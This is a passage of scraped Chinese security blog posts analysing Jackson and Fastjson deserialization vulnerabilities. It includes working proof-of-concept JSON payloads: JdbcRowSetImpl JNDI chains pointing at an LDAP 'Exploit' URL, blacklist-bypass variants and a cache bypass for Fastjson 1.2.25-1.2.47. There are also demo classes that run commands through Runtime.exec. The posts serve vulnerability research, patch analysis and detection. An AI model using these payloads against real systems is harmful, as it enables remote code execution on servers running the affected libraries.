接着程序回到数组类型解析的AsArrayTypeDeserializer._deserialize()函数中往下执行，用刚刚获取到的反序列化器来解析sex属性中数组内的具体类型实例： 然后会再次调用BeanDeserializer.deserialize()-&gt;BeanDeserializer.vanillaDeserialize()来解析数组内的内容，其中调用createUsingDefault()函数的时候会调用到MySex类的无参构造函数来新建MySex类对象： 获取到MySex类对象后，回到vanillaDeserialize()函数中扫描到该类对象的sex属性后，调用deserializeAndSet()函数获取该属性值并设置到该实例中： 跟进MethodProperty.deserializeAndSet()函数，先是获取sex属性值，其调用过程和前面一样；然后就是通过反射机制调用该属性的setter方法进行设置： 至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo注解的函数调用过程也是一样的。 简单梳理一遍，Jackson反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。 调用到MySex类的构造函数时的函数调用栈： 12345678910111213141516171819&lt;init&gt;:6, MySex (com.mi1k7ea)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)call:119, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)createUsingDefault:243, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)vanillaDeserialize:249, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromObject:58, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:142, AbstractDeserializer (com.fasterxml.jackson.databind.deser)deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:11, JSTest 调用到MySex类sex属性的setter方法时的函数调用栈： 123456789101112131415161718setSex:17, MySex (com.mi1k7ea)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeTypedFromObject:58, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)deserializeWithType:142, AbstractDeserializer (com.fasterxml.jackson.databind.deser)deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)main:11, JSTest 结论在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。 0x05 Jackson反序列化漏洞前提条件满足下面三个条件之一即存在Jackson反序列化漏洞： 调用了ObjectMapper.enableDefaultTyping()函数； 对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解； 对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解； 漏洞原理由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。 而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。 漏洞场景及Demo这里大致以要进行反序列化的类的属性所属的类的类型分为两种： 属性不为Object类时当要进行反序列化的类的属性所属类的构造函数或setter方法本身存在漏洞时，这种场景存在Jackson反序列化漏洞。当然这种场景开发几乎不会这么写。 我们看个例子，直接修改MySex类的setSex()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）： 1234567891011121314151617181920212223public class MySex implements Sex &#123; int sex; public MySex() &#123; System.out.println(\"MySex构造函数\"); &#125; @Override public int getSex() &#123; System.out.println(\"MySex.getSex\"); return sex; &#125; @Override public void setSex(int sex) &#123; System.out.println(\"MySex.setSex\"); this.sex = sex; try &#123; Runtime.getRuntime().exec(\"calc\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Person类： 123456789101112131415public class Person &#123; public int age; public String name;// @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) public Sex sex; public Person() &#123; System.out.println(\"Person构造函数\"); &#125; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, sex == null ? \"null\" : sex); &#125;&#125; JSTest.java： 12345678910public class JSTest &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json = \"&#123;\\\"age\\\":6,\\\"name\\\":\\\"mi1k7ea\\\",\\\"sex\\\":[\\\"com.mi1k7ea.MySex\\\",&#123;\\\"sex\\\":1&#125;]&#125;\"; Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 运行即可弹计算器： 属性为Object类时当属性类型为Object时，因为Object类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或setter方法存在漏洞代码的类即可进行攻击利用。 后面出现的Jackson反序列化的CVE漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链而已。 这里我们假设目标服务端环境中存在其一个恶意类Evil，其setter方法存在任意代码执行漏洞，存在于com.evil包中： 1234567891011121314package com.evil;public class Evil &#123; String cmd; public void setCmd(String cmd) &#123; this.cmd = cmd; try &#123; Runtime.getRuntime().exec(this.cmd); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Person类，将sex属性改为object属性： 123456789101112131415public class Person &#123; public int age; public String name;// @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) public Object object; public Person() &#123; System.out.println(\"Person构造函数\"); &#125; @Override public String toString() &#123; return String.format(\"Person.age=%d, Person.name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125; JSTest.java： 123456789101112public class JSTest &#123; public static void main(String[] args) throws Exception &#123; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json = \"&#123;\\\"age\\\":6,\\\"name\\\":\\\"mi1k7ea\\\",\\\"object\\\":[\\\"com.evil.Evil\\\",&#123;\\\"cmd\\\":\\\"calc\\\"&#125;]&#125;\"; Person p2 = mapper.readValue(json, Person.class); System.out.println(p2); &#125;&#125; 运行即可触发： OK，Jackson反序列化漏洞相关的一些基本概念都说到了，后面的几篇文章就分别对Jackson反序列化的几个CVE漏洞以及不同的利用链进行分析。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Fastjson系列五——高版本JDK绕过及检测与防御","date":"2019-11-13T13:44:51.000Z","path":"2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/","text":"0x01 高版本JDK绕过由之前利用的PoC知道，利用范围最广的PoC是基于com.sun.rowset.JdbcRowSetImpl的利用链的，而这种利用方式是基于JNDI注入漏洞的，是需要我们有RMI服务或LDAP服务。 这样就会导致一个限制的问题，即JNDI注入漏洞利用的限制问题——JDK版本。 由之前的分析知道，JDK对于JNDI注入漏洞在不同版本有着不同的防御措施： JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 因此，相比之下，我们在Fastjson反序列化漏洞的基于com.sun.rowset.JdbcRowSetImpl的利用链上，更倾向于使用LDAP服务来实现攻击利用，因为其对于JDK的适用范围更广。 但是如果目标环境的JDK版本在6u211、7u201、8u191之后，我们是不是就没有办法绕过了呢？ 当然是有的，KINGX大佬已经写：如何绕过高版本JDK的限制进行JNDI注入利用 主要是有两种方式： 利用本地Class作为Reference Factory 利用LDAP返回序列化数据，触发本地Gadget 具体可参考另一篇文章：浅析高低版JDK下的JNDI注入及绕过 0x02 检测方法全局搜索是否使用到了Fastjson，若使用了则进一步排查是否为漏洞版本号即1.2.22-1.2.47，若是则可能存在反序列化漏洞的风险，需进一步排查。 全局搜索如下关键代码，若存在则进一步排查参数是否外部可控： 123import com.alibaba.fastjson.JSON;JSON.parse(JSON.parseObject( 0x03 防御方法升级到最新版的Fastjson。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）","date":"2019-11-11T13:54:53.000Z","path":"2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/","text":"0x01 影响版本Fastjson 1.2.x系列的1.2.25-1.2.47版本。 0x02 限制主要是JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。 0x03 复现利用本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。 绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。 Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本： 12345678public class JdbcRowSetImplPoc &#123; public static void main(String[] argv)&#123; String payload = \"&#123;\\\"a\\\":&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\" + \"\\\"b\\\":&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\" + \"\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"autoCommit\\\":true&#125;&#125;\"; JSON.parse(payload); &#125;&#125; 此外，还需要开启RMI服务或LDAP服务以及放置恶意类的Web服务，具体可参考之前的Fastjson系列文章即可。 运行能成功弹计算器： 这里，我们看看PoC是怎么写的： 1234567891011&#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true &#125;&#125; 可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。 但是如果目标服务端开启了AutoTypeSupport呢？经测试发现： 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发； 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用； 0x04 调试分析下面我们来调试分析下该PoC为啥会成功。 不受AutoTypeSupport影响的版本不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。 未开启AutoTypeSupport时在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。 在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回： 往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量： 接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类： 在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中： 在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测： 开启AutoTypeSupport时由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。 在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类： 关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？ 我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的： 1if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; 第一个判断条件Arrays.binarySearch(denyHashCodes, hash) &gt;= 0是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件TypeUtils.getClassFromMapping(typeName) == null，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。 受AutoTypeSupport影响的版本受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。 开启AutoTypeSupport时我们在开启AutoTypeSupport之后，会利用失败，报如下错： 1Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl 调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。 在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持： 可以明显看到，第一个if语句是白名单过滤，第二个if语句是黑名单过滤，其中黑名单过滤的if语句中的判断条件和前面的不受影响的版本的不一样，对比下是少了个判断条件，即TypeUtils.getClassFromMapping(typeName) == null。 未开启AutoTypeSupport时当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。 这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码： 对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过&amp;&amp;多添加了一个判断条件TypeUtils.getClassFromMapping(typeName) == null，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过： 12345// 受AutoTypeSupport影响的版本if (className.startsWith(deny)) &#123;// 不受AutoTypeSupport影响的版本if (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; 0x05 补丁分析1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。 运行会报错： 1Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl 调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。 1.2.48版本： 1.2.47版本： 导致目标类并不能缓存到Map中了： 因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉： OK，19年的Fastjson反序列化漏洞就分析到这，后面是Fastjson系列的最后一篇了，说下检测与防御方法、高版本JDK绕过等等。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Fastjson系列三——历史版本补丁绕过（需开启AutoType）","date":"2019-11-10T04:07:43.000Z","path":"2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/","text":"在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。 网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。 注意：本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功。 0x01 哈希黑名单通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。 从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist 目前已知的哈希黑名单的对应表如下： version hash hex-hash name 1.2.42 -8720046426850100497 0x86fc2bf9beaf7aefL org.apache.commons.collections4.comparators 1.2.42 -8109300701639721088 0x8f75f9fa0df03f80L org.python.core 1.2.42 -7966123100503199569 0x9172a53f157930afL org.apache.tomcat 1.2.42 -7766605818834748097 0x9437792831df7d3fL org.apache.xalan 1.2.42 -6835437086156813536 0xa123a62f93178b20L javax.xml 1.2.42 -4837536971810737970 0xbcdd9dc12766f0ceL org.springframework. 1.2.42 -4082057040235125754 0xc7599ebfe3e72406L org.apache.commons.beanutils 1.2.42 -2364987994247679115 0xdf2ddff310cdb375L org.apache.commons.collections.Transformer 1.2.42 -1872417015366588117 0xe603d6a51fad692bL org.codehaus.groovy.runtime 1.2.42 -254670111376247151 0xfc773ae20c827691L java.lang.Thread 1.2.42 -190281065685395680 0xfd5bfc610056d720L javax.net. 1.2.42 313864100207897507 0x45b11bc78a3aba3L com.mchange 1.2.42 1203232727967308606 0x10b2bdca849d9b3eL org.apache.wicket.util 1.2.42 1502845958873959152 0x14db2e6fead04af0L java.util.jar. 1.2.42 3547627781654598988 0x313bb4abd8d4554cL org.mozilla.javascript 1.2.42 3730752432285826863 0x33c64b921f523f2fL java.rmi 1.2.42 3794316665763266033 0x34a81ee78429fdf1L java.util.prefs. 1.2.42 4147696707147271408 0x398f942e01920cf0L com.sun. 1.2.42 5347909877633654828 0x4a3797b30328202cL java.util.logging. 1.2.42 5450448828334921485 0x4ba3e254e758d70dL org.apache.bcel 1.2.42 5751393439502795295 0x4fd10ddc6d13821fL java.net.Socket 1.2.42 5944107969236155580 0x527db6b46ce3bcbcL org.apache.commons.fileupload 1.2.42 6742705432718011780 0x5d92e6ddde40ed84L org.jboss 1.2.42 7179336928365889465 0x63a220e60a17c7b9L org.hibernate 1.2.42 7442624256860549330 0x6749835432e0f0d2L org.apache.commons.collections.functors 1.2.42 8838294710098435315 0x7aa7ee3627a19cf3L org.apache.myfaces.context.servlet 1.2.43 -2262244760619952081 0xe09ae4604842582fL java.net.URL 1.2.46 -8165637398350707645 0x8eadd40cb2a94443L junit. 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 1.2.46 -7921218830998286408 0x92122d710e364fb8L org.osjava.sj. 1.2.46 -7768608037458185275 0x94305c26580f73c5L org.apache.log4j. 1.2.46 -6179589609550493385 0xaa3daffdb10c4937L org.logicalcobwebs. 1.2.46 -5194641081268104286 0xb7e8ed757f5d13a2L org.apache.logging. 1.2.46 -3935185854875733362 0xc963695082fd728eL org.apache.commons.dbcp 1.2.46 -2753427844400776271 0xd9c9dbf6bbd27bb1L com.ibatis.sqlmap.engine.datasource 1.2.46 -1589194880214235129 0xe9f20bad25f60807L org.jdom. 1.2.46 1073634739308289776 0xee6511b66fd5ef0L org.slf4j. 1.2.46 5688200883751798389 0x4ef08c90ff16c675L javassist. 1.2.46 7017492163108594270 0x616323f12c2ce25eL oracle.net 1.2.46 8389032537095247355 0x746bd4a53ec195fbL org.jaxen. 1.2.48 1459860845934817624 0x144277b467723158L java.net.InetAddress 1.2.48 8409640769019589119 0x74b50bb9260e31ffL java.lang.Class 1.2.49 4904007817188630457 0x440e89208f445fb9L com.alibaba.fastjson.annotation 1.2.59 5100336081510080343 0x46c808a4b5841f57L org.apache.cxf.jaxrs.provider. 1.2.59 6456855723474196908 0x599b5c1213a099acL ch.qos.logback. 1.2.59 8537233257283452655 0x767a586a5107feefL net.sf.ehcache.transaction.manager. 1.2.60 3688179072722109200 0x332f0b5369a18310L com.zaxxer.hikari. 1.2.61 -4401390804044377335 0xc2eb1e621f439309L flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor 1.2.61 -1650485814983027158 0xe9184be55b1d962aL org.apache.openjpa.ee. 1.2.61 -1251419154176620831 0xeea210e8da2ec6e1L oracle.jdbc.rowset.OracleJDBCRowSet 1.2.61 -9822483067882491 0xffdd1a80f1ed3405L com.mysql.cj.jdbc.admin. 1.2.61 99147092142056280 0x1603dc147a3e358L oracle.jdbc.connector.OracleManagedConnectionFactory 1.2.61 3114862868117605599 0x2b3a37467a344cdfL org.apache.ibatis.parsing. 1.2.61 4814658433570175913 0x42d11a560fc9fba9L org.apache.axis2.jaxws.spi.handler. 1.2.61 6511035576063254270 0x5a5bd85c072e5efeL jodd.db.connection. 1.2.61 8925522461579647174 0x7bddd363ad3998c6L org.apache.commons.configuration.JNDIConfiguration 1.2.62 -9164606388214699518 0x80d0c70bcc2fea02L org.apache.ibatis.executor. 1.2.62 -8649961213709896794 0x87f52a1b07ea33a6L net.sf.cglib. 1.2.62 -5764804792063216819 0xafff4c95b99a334dL com.mysql.cj.jdbc.MysqlDataSource 1.2.62 -4438775680185074100 0xc2664d0958ecfe4cL aj.org.objectweb.asm. 1.2.62 -3319207949486691020 0xd1efcdf4b3316d34L oracle.jdbc. 1.2.62 -2192804397019347313 0xe1919804d5bf468fL org.apache.commons.collections.comparators. 1.2.62 -2095516571388852610 0xe2eb3ac7e56c467eL net.sf.ehcache.hibernate. 1.2.62 4750336058574309 0x10e067cd55c5e5L com.mysql.cj.log. 1.2.62 218512992947536312 0x3085068cb7201b8L org.h2.jdbcx. 1.2.62 823641066473609950 0xb6e292fa5955adeL org.apache.commons.logging. 1.2.62 1534439610567445754 0x154b6cb22d294cfaL org.apache.ibatis.reflection. 1.2.62 1818089308493370394 0x193b2697eaaed41aL org.h2.server. 1.2.62 2164696723069287854 0x1e0a8c3358ff3daeL org.apache.ibatis.datasource. 1.2.62 2653453629929770569 0x24d2f6048fef4e49L org.objectweb.asm. 1.2.62 2836431254737891113 0x275d0732b877af29L flex.messaging.util.concurrent. 1.2.62 3089451460101527857 0x2adfefbbfe29d931L org.apache.ibatis.javassist. 1.2.62 3718352661124136681 0x339a3e0b6beebee9L org.apache.ibatis.ognl. 1.2.62 4046190361520671643 0x3826f4b2380c8b9bL com.mysql.cj.jdbc.MysqlConnectionPoolDataSource 1.2.62 6280357960959217660 0x5728504a6d454ffcL org.apache.ibatis.scripting. 1.2.62 6734240326434096246 0x5d74d3e5b9370476L com.mysql.cj.jdbc.MysqlXADataSource 1.2.62 7123326897294507060 0x62db241274397c34L org.apache.commons.collections.functors. 1.2.62 8488266005336625107 0x75cc60f5871d0fd3L org.apache.commons.configuration 目前未知的哈希黑名单： version hash hex-hash name 1.2.42 33238344207745342 0x761619136cc13eL 1.2.62 -6316154655839304624 0xa85882ce1044c450L 1.2.62 -5472097725414717105 0xb40f341c746ec94fL 1.2.62 -4608341446948126581 0xc00be1debaf2808bL 1.2.62 3256258368248066264 0x2d308dbbc851b0d8L 1.2.62 4841947709850912914 0x43320dc9d2ae0892L 1.2.62 6534946468240507089 0x5ab0cb3071ab40d1L 0x02 1.2.25-1.2.41补丁绕过绕过利用本地fastjson用的是1.2.41版本。 这里Demo还是用的《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》中基于JdbcRowSetImpl的利用链的PoC。 直接运行的话会报错，原因就是checkAutoType()函数中的黑名单过滤了”com.sun.”： 下面我们直接给出payload： 1&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 关键PoC为：Lcom.sun.rowset.JdbcRowSetImpl; 注意是要开启AutoTypeSupport的，添加以下代码就ok了： 1ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 直接运行即可绕过checkAutoType()黑名单实现弹计算器： 调试分析我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。 下面我们调试分析看看为啥会绕过。 我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验，再往下开始调用TypeUtils.loadClass()： 跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过： 0x03 1.2.25-1.2.42补丁绕过绕过利用先直接给出payload： 1&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 关键PoC为：LLcom.sun.rowset.JdbcRowSetImpl;; 在1.2.22-1.2.42版本运行都能成功触发： 调试分析自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单： 1denyHashCodes = new long[]&#123;-8720046426850100497L,-8109300701639721088L,-7966123100503199569L,-7766605818834748097L,-6835437086156813536L,-4837536971810737970L,-4082057040235125754L,-2364987994247679115L,-1872417015366588117L,-254670111376247151L,-190281065685395680L,33238344207745342L,313864100207897507L,1203232727967308606L,1502845958873959152L,3547627781654598988L,3730752432285826863L,3794316665763266033L,4147696707147271408L,5347909877633654828L,5450448828334921485L,5751393439502795295L,5944107969236155580L,6742705432718011780L,7179336928365889465L,7442624256860549330L,8838294710098435315L&#125;; 在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作： 但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。 后面的代码，是对提取出来的className即Lcom.sun.rowset.JdbcRowSetImpl;进行denyList黑名单过滤，也就顺利绕过了。 注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的LLcom.sun.rowset.JdbcRowSetImpl;;： 为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名： 0x04 1.2.25-1.2.43补丁绕过绕过利用直接给出payload： 1&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 关键PoC：[com.sun.rowset.JdbcRowSetImpl 但是如果我们一开始payload直接这样写是会报错的： 1&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置： 1Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &apos;[&apos;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;autoCommit&quot;:true&#125; 因此改下payload，在第一个逗号前面加个”[“： 1&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置： 1Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 43, fastjson-version 1.2.43 因此就修改得到最终版payload，能够成功触发： 调试分析调试发现，在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错： 但是以”[“开头的类名自然能成功绕过上述校验以及黑名单过滤。 继续往下调试，在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类： 